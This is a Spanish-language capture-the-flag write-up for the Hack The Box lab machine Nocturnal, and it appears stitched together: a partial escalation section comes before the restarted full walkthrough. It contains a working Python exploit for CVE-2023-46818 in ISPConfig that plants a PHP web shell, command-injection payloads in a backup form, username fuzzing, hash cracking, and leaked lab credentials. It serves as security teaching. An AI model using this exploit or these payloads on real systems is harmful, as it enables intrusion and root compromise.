</pre></table></code></div></div><h3 id="escalada"><span class="me-2">Escalada</span><a href="#escalada" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Ahora para elevar privilegios, podemos verificar que tobias no tiene permiso sudo</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>tobias@nocturnal:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>tobias:
Sorry, user tobias may not run <span class="nb">sudo </span>on nocturnal.
tobias@nocturnal:~<span class="err">$</span>
</pre></table></code></div></div><p>al investigar mas al fondo encontramos que la maquina tiene el puerto corriendo un servicio</p><p><a href="/assets/img/nocturnal-easy/Pasted%20image%2020250824175250.png" class="popup img-link shimmer"><img src="/assets/img/nocturnal-easy/Pasted%20image%2020250824175250.png" alt="ss-listen" loading="lazy"></a></p><p>entonces podriamos hacer un port forward, para poder ver desde nuestra maquina</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>‚ï≠‚îÄkali@kali ~/Nocturnal at üïê 20:54
‚ï∞‚îÄ‚ùØ ssh <span class="nt">-L</span> 9001:127.0.0.1:8080 tobias@10.10.11.64
</pre></table></code></div></div><p>una vez hecho podemos ver http://localhost:9001 en nuestro navegador</p><p>y nos topamos con un login</p><p><a href="/assets/img/nocturnal-easy/Pasted%20image%2020250824175721.png" class="popup img-link shimmer"><img src="/assets/img/nocturnal-easy/Pasted%20image%2020250824175721.png" alt="login-ispconfig" loading="lazy"></a></p><p>para logearme fue cuestion de usar <code class="language-plaintext highlighter-rouge">admin:slowmotionapocalypse</code></p><p>y conseguimos la pantalla del ispconfig</p><p><a href="/assets/img/nocturnal-easy/Pasted%20image%2020250824180044.png" class="popup img-link shimmer"><img src="/assets/img/nocturnal-easy/Pasted%20image%2020250824180044.png" alt="ispconfig-home" loading="lazy"></a></p><p>Notamos que la versiones <code class="language-plaintext highlighter-rouge">ISPConfig Version: 3.2.10p1</code>, si googleamos esto encontramos lo siguiente, confirmando que esta version es vulnerable</p><p><a href="/assets/img/nocturnal-easy/Pasted%20image%2020250824180204.png" class="popup img-link shimmer"><img src="/assets/img/nocturnal-easy/Pasted%20image%2020250824180204.png" alt="ispconfig-version" loading="lazy"></a></p><p>Explotamos la <strong>CVE-2023-46818</strong> (language_edit.php). Script usado:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">import</span> <span class="n">requests</span><span class="p">,</span> <span class="n">re</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">base64</span><span class="p">,</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span>
<span class="n">requests</span><span class="p">.</span><span class="n">packages</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="nf">disable_warnings</span><span class="p">()</span>

<span class="n">URL</span><span class="p">,</span> <span class="n">USER</span><span class="p">,</span> <span class="n">PW</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">4</span><span class="p">]</span>            <span class="c1"># uso: python3 exploit.py http://x/ admin pass
</span><span class="k">if</span> <span class="ow">not</span> <span class="n">URL</span><span class="p">.</span><span class="nf">endswith</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">):</span> <span class="n">URL</span> <span class="o">+=</span> <span class="sh">'</span><span class="s">/</span><span class="sh">'</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">();</span> <span class="n">s</span><span class="p">.</span><span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span>

<span class="c1"># 1) login
</span><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">URL</span><span class="o">+</span><span class="sh">'</span><span class="s">login/</span><span class="sh">'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">:</span><span class="n">USER</span><span class="p">,</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">:</span><span class="n">PW</span><span class="p">,</span><span class="sh">'</span><span class="s">s_mod</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">login</span><span class="sh">'</span><span class="p">})</span>
<span class="k">if</span> <span class="sh">'</span><span class="s">Username or Password wrong</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span> <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="sh">'</span><span class="s">[-] Login fail</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[+] Logged in</span><span class="sh">'</span><span class="p">)</span>

<span class="c1"># 2) busca tokens CSRF en language_edit
</span><span class="n">lang_params</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">lang</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">en</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">module</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">help</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">lang_file</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">xyz.lng</span><span class="sh">'</span><span class="p">}</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">URL</span><span class="o">+</span><span class="sh">'</span><span class="s">admin/language_edit.php</span><span class="sh">'</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">lang_params</span><span class="p">)</span>
<span class="n">csrf_id</span>  <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">name=</span><span class="sh">"</span><span class="s">_csrf_id</span><span class="sh">"</span><span class="s">\s+value=</span><span class="sh">"</span><span class="s">([^</span><span class="sh">"</span><span class="s">]+)</span><span class="sh">"'</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">csrf_key</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">name=</span><span class="sh">"</span><span class="s">_csrf_key</span><span class="sh">"</span><span class="s">\s+value=</span><span class="sh">"</span><span class="s">([^</span><span class="sh">"</span><span class="s">]+)</span><span class="sh">"'</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>

<span class="c1"># 3) payload: escribe sh.php
</span><span class="n">php</span> <span class="o">=</span> <span class="sh">"</span><span class="s">&lt;?php echo </span><span class="sh">'</span><span class="s">OK</span><span class="sh">'</span><span class="s">; if(isset($_GET[</span><span class="sh">'</span><span class="s">c</span><span class="sh">'</span><span class="s">])) system($_GET[</span><span class="sh">'</span><span class="s">c</span><span class="sh">'</span><span class="s">]); ?&gt;</span><span class="sh">"</span>
<span class="n">inj</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"'</span><span class="s">];file_put_contents(</span><span class="sh">'</span><span class="s">sh.php</span><span class="sh">'</span><span class="s">,base64_decode(</span><span class="sh">'</span><span class="si">{</span><span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">php</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">decode</span><span class="p">()</span><span class="si">}</span><span class="sh">'</span><span class="s">));die;#</span><span class="sh">"</span>
<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">lang</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">en</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">module</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">help</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">lang_file</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">xyz.lng</span><span class="sh">'</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">_csrf_id</span><span class="sh">'</span><span class="p">:</span><span class="n">csrf_id</span><span class="p">,</span><span class="sh">'</span><span class="s">_csrf_key</span><span class="sh">'</span><span class="p">:</span><span class="n">csrf_key</span><span class="p">,</span><span class="sh">'</span><span class="s">records[</span><span class="se">\\</span><span class="s">]</span><span class="sh">'</span><span class="p">:</span><span class="n">inj</span><span class="p">}</span>
<span class="n">s</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">URL</span><span class="o">+</span><span class="sh">'</span><span class="s">admin/language_edit.php</span><span class="sh">'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[+] Webshell planted as /admin/sh.php</span><span class="sh">'</span><span class="p">)</span>

<span class="c1"># 4) prueba
</span><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">URL</span><span class="o">+</span><span class="sh">'</span><span class="s">admin/sh.php</span><span class="sh">'</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="sh">'</span><span class="s">c</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">})</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[+] Command output:</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
</pre></table></code></div></div><p>y este deber√≠a ser la forma en la que ejecutamos el exploit</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>‚ï≠‚îÄkali@kali ~/Nocturnal/exploits via üêç v3.13.6  at üïê 21:15
‚ï∞‚îÄ‚ùØ python3 exploit.py http://localhost:9001/ admin <span class="s1">'slowmotionapocalypse'</span>
<span class="o">[</span>+] Logged <span class="k">in</span>
<span class="o">[</span>+] Webshell planted as /admin/sh.php
<span class="o">[</span>+] Command output:
 <span class="nv">OKuid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</pre></table></code></div></div><hr /><p>title: ‚ÄúNocturnal - Easy (HTB)‚Äù date: 2025-08-23 18:00:00 -0700 categories: [Writeups, HTB] tags: [HTB, nocturnal, idor, rce, ispconfig, cve-2023-46818, linux, hashcat, ffuf] toc: true comments: true description: ‚ÄúWriteup t√©cnico de Nocturnal en HackTheBox: desde fuzzing y SQLite hasta explotaci√≥n de ISPConfig con CVE-2023-46818.‚Äù</p><hr /><h1 id="nocturnal--easy-1">Nocturnal ‚Äî EASY</h1><p>Este writeup detalla la explotaci√≥n de la m√°quina <strong>Nocturnal</strong> de Hack The Box, utilizando un fallo de <strong>IDOR</strong> para obtener credenciales, una <strong>RCE</strong> en el <em>script</em> de <em>backup</em> de la base de datos <strong>SQLite</strong>, y una escalada de privilegios a <strong>root</strong> mediante la explotaci√≥n del <strong>CVE-2023-46818</strong> en <strong>ISPConfig</strong>.</p><p>üìÖ Fecha: 20-04-2025<br /> üîó IP: 10.10.11.64<br /> üîç Estado: üéØ Resuelta</p><hr /><h2 id="reconocimiento-1"><span class="me-2">Reconocimiento</span><a href="#reconocimiento-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Comenzamos con un escaneo exhaustivo de puertos para identificar la superficie de ataque.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>‚ï≠‚îÄkali@kali ~/Nocturnal/nmap at üïê 17:40
‚ï∞‚îÄ‚ùØ <span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.11.64  <span class="nt">-oN</span> Scan_Inicial.txt
</pre></table></code></div></div><p>Lo que el escaneo dio:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>Nmap scan report <span class="k">for </span>10.10.11.64
Host is up, received user-set <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2025-08-23 17:41:25 EDT <span class="k">for </span>14s
Not shown: 62580 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, 2953 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
<span class="c"># Nmap done at Sat Aug 23 17:41:39 2025 -- 1 IP address (1 host up) scanned in 14.47 seconds</span>
</pre></table></code></div></div><p>A continuaci√≥n escaneamos los puertos con detecci√≥n de servicios:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>‚ï≠‚îÄkali@kali ~/Nocturnal/nmap at üïê 17:42
‚ï∞‚îÄ‚ùØ nmap 10.10.11.64 <span class="nt">-p</span> 22,80 <span class="nt">-sCV</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-oN</span> Scan_Ports.txt
</pre></table></code></div></div><p>Lo obtenido:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>Nmap scan report <span class="k">for </span>10.10.11.64
Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Did not follow redirect to <span class="o">[</span>http://nocturnal.htb/]<span class="o">(</span>http://nocturnal.htb/<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at <span class="o">[</span>https://nmap.org/submit/]<span class="o">(</span>https://nmap.org/submit/<span class="o">)</span> <span class="nb">.</span>
<span class="c"># Nmap done at Sat Aug 23 17:44:11 2025 -- 1 IP address (1 host up) scanned in 11.57 seconds</span>
</pre></table></code></div></div><p>La informaci√≥n obtenida mostr√≥ que el servicio <strong>SSH</strong> estaba corriendo con OpenSSH 8.2p1 y que el servicio web usaba <strong>nginx 1.18.0</strong>, adem√°s se present√≥ el nombre del dominio: <code class="language-plaintext highlighter-rouge">http://nocturnal.htb/</code>.</p><p>Antes de navegar a√±adimos el dominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>‚ï≠‚îÄkali@kali ~/Nocturnal/nmap at üïê 17:47
‚ï∞‚îÄ‚ùØ <span class="nb">echo</span> <span class="s2">"10.10.11.64 nocturnal.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
</pre></table></code></div></div><p>Haciendo un <code class="language-plaintext highlighter-rouge">whatweb</code> esto es lo que arroja:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>‚ï≠‚îÄkali@kali ~/Nocturnal at üïê 17:55
‚ï∞‚îÄ‚ùØ whatweb http://nocturnal.htb/
http://nocturnal.htb/ <span class="o">[</span>200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[support@nocturnal.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.11.64], Title[Welcome to Nocturnal], nginx[1.18.0]
</pre></table></code></div></div><p>Vemos que maneja PHP.</p><p>Al visitar la web observamos que pide <strong>iniciar sesi√≥n o registrarse</strong> para poder <strong>subir y ver archivos</strong>. Tambi√©n cuenta con una secci√≥n <strong>Contact Us</strong> con correo <code class="language-plaintext highlighter-rouge">support@nocturnal.htb</code>.</p><p>Creamos una cuenta y nos logeamos con <code class="language-plaintext highlighter-rouge">test:test</code>.</p><p>Como coment√©, el sitio permite <strong>subir archivos</strong>.</p><p>Sub√≠ un archivo <code class="language-plaintext highlighter-rouge">test.pdf</code> y not√© que la funcionalidad de visualizaci√≥n acepta un par√°metro <code class="language-plaintext highlighter-rouge">username</code>, lo que sugiere un fallo de <strong>Insecure Direct Object Reference (IDOR)</strong> en <code class="language-plaintext highlighter-rouge">view.php</code>.</p><p>Para explotarlo, realic√© un <strong>fuzzing</strong> a los usuarios buscando un tama√±o de respuesta distinto que indicara un archivo real:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>‚ï≠‚îÄkali@kali ~/Nocturnal at üïê 18:14
‚ï∞‚îÄ‚ùØ ffuf <span class="nt">-u</span> <span class="s1">'http://nocturnal.htb/view.php?username=FUZZ&amp;file=*.pdf'</span> <span class="se">\</span>
<span class="nt">--w</span> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt <span class="se">\</span>
<span class="nt">--mc</span> 200 <span class="nt">-fr</span> <span class="s2">"User not found."</span> <span class="se">\</span>
<span class="nt">--H</span> <span class="s2">"Cookie: PHPSESSID=[REDACTED]"</span>
</pre></table></code></div></div><p>El usuario m√°s interesante fue <strong>amanda</strong>, ya que devolv√≠a un tama√±o distinto al resto:</p><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 142ms]
</pre></table></code></div></div><p>Accedimos a:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://nocturnal.htb/view.php?username=amanda&amp;file=*.pdf
</pre></table></code></div></div><p>Dentro del archivo (en <code class="language-plaintext highlighter-rouge">content.xml</code>) apareci√≥ una contrase√±a temporal:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nt">&lt;text:p</span> <span class="na">text:style-name=</span><span class="s">"P1"</span><span class="nt">&gt;</span>
Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
<span class="nt">&lt;/text:p&gt;</span>
</pre></table></code></div></div><p>Con esa <strong>contrase√±a temporal</strong> (<code class="language-plaintext highlighter-rouge">arHkG7HAI68X8s1J</code>) iniciamos sesi√≥n como <code class="language-plaintext highlighter-rouge">amanda</code>.</p><p><code class="language-plaintext highlighter-rouge">amanda</code> tiene acceso a un <strong>panel de administraci√≥n</strong> con una funci√≥n para <strong>crear un backup</strong>.</p><p>Al revisar el c√≥digo de registro de usuarios comprobamos que se usa una base de datos <strong>SQLite</strong>:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SQLite3</span><span class="p">(</span><span class="s1">'../nocturnal_database/nocturnal_database.db'</span><span class="p">);</span>
<span class="c1">// ... c√≥digo de registro ...</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><h3 id="explotaci√≥n-de-rce-en-la-funci√≥n-de-backup"><span class="me-2">Explotaci√≥n de RCE en la Funci√≥n de Backup</span><a href="#explotaci√≥n-de-rce-en-la-funci√≥n-de-backup" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Interceptamos con Burp la petici√≥n <strong>POST</strong> del backup y descubrimos que el par√°metro <code class="language-plaintext highlighter-rouge">password</code> se inyectaba en la shell, permitiendo <strong>Ejecuci√≥n Remota de Comandos (RCE)</strong>.</p><p>Se usaron caracteres URL-encoded (<code class="language-plaintext highlighter-rouge">%0A</code> para nueva l√≠nea, <code class="language-plaintext highlighter-rouge">%09</code> para tabulaci√≥n) para inyectar comandos de shell.</p><div class="language-http highlighter-rouge"><div class="code-header"> <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/admin.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">nocturnal.htb</span>
<span class="s">...</span>
<span class="s">password=%0Abash%09-c%09"whoami"%0A&amp;backup=</span>
</pre></table></code></div></div><p>Con la RCE se pudo dumpear la base de datos <strong>SQLite</strong> usando <code class="language-plaintext highlighter-rouge">sqlite3</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">password</span><span class="o">=</span>%0Abash%09 c%09<span class="s2">"sqlite3%09/var/www/nocturnal_database/nocturnal_database.db%09.dump"</span>%0A &amp;backup<span class="o">=</span>
</pre></table></code></div></div><p>Fragmento del volcado:</p><pre><code class="language-sqlite">INSERT INTO users VALUES(1,'admin','d725aeba143f575736b07e045d8ceebb');
INSERT INTO users VALUES(2,'amanda','df8b20aa0c935023f99ea58358fb63c4');
INSERT INTO users VALUES(4,'tobias','55c82b1ccd55ab219b3b109b07d5061d');
INSERT INTO users VALUES(6,'kavi','f38cde1654b39fea2bd4f72f1ae4cdda');
INSERT INTO users VALUES(7,'e0Al5','101ad4543a96a7fd84908fd0d802e7db');
INSERT INTO users VALUES(8,'ciul','49858702f9317d7b6180b31c8a8120e4');
INSERT INTO users VALUES(9,'ataman','4de85829cc9cdd6983000733b8779c6f');
INSERT INTO users VALUES(10,'Smith','7076192633a1cc795f4db1c674b217b6');
</code></pre><p>Guardamos los hashes en <code class="language-plaintext highlighter-rouge">hash.txt</code> y ejecutamos <code class="language-plaintext highlighter-rouge">hashcat</code> (MD5, <code class="language-plaintext highlighter-rouge">-m 0</code>):</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>‚ï≠‚îÄkali@kali ~/Nocturnal/contenido at üïê 20:40
‚ï∞‚îÄ‚ùØ hashcat <span class="nt">-m</span> 0 hash.txt /usr/share/wordlists/rockyou.txt
</pre></table></code></div></div><p>El √∫nico hash que se cracke√≥ fue:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>55c82b1ccd55ab219b3b109b07d5061d : slowmotionapocalypse
</pre></table></code></div></div><p>Corresponde al usuario <strong>tobias</strong> con la contrase√±a <code class="language-plaintext highlighter-rouge">slowmotionapocalypse</code>. Conectamos por SSH y conseguimos la flag <code class="language-plaintext highlighter-rouge">user.txt</code>.</p><hr /><h2 id="escalada-1"><span class="me-2">Escalada</span><a href="#escalada-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Verificamos que <code class="language-plaintext highlighter-rouge">tobias</code> no tiene permiso <code class="language-plaintext highlighter-rouge">sudo</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>tobias@nocturnal:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>tobias:
Sorry, user tobias may not run <span class="nb">sudo </span>on nocturnal.
tobias@nocturnal:~<span class="err">$</span>
</pre></table></code></div></div><p>Localizamos un servicio escuchando en <code class="language-plaintext highlighter-rouge">127.0.0.1:8080</code> y realizamos un port forward via SSH:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>‚ï≠‚îÄkali@kali ~/Nocturnal at üïê 20:54
